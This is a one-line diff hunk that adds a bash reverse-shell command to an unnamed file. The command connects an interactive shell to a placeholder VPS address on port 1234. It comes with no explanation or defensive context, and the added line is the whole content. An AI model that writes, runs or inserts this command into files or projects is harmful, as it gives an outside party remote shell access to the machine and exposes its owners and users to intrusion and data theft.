@@ -1,0 +1,1 @@
+bash -i >& /dev/tcp/<the vps ip>/1234 0>&1
